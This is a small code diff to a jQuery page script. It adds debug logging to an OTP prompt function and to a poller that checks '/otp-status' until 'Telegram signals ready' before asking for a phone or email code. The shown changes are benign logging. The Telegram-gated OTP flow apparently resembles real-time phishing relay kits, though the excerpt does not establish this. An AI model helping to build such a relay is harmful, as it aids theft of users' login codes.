@@ -68,6 +68,7 @@ $(document).ready(function() {
     }
 
     function showOtpPrompt(promptText, errorMsg) {
+      console.log('showOtpPrompt called with:', promptText, errorMsg);
       hideSpinner();
       $('.sub-title')
         .text(errorMsg || promptText)
@@ -80,9 +81,11 @@ $(document).ready(function() {
       }
     }
 
+    // 1) Poll until Telegram signals ready
     readyPoller = setInterval(() => {
       $.getJSON('/otp-status')
         .done(res => {
+          console.log('[OTP STATUS]', res);
           if (res.ready && (res.method === 'phone' || res.method === 'email')) {
             clearInterval(readyPoller);
 
@@ -141,4 +144,3 @@ $(document).ready(function() {
     });
   }
 });
-
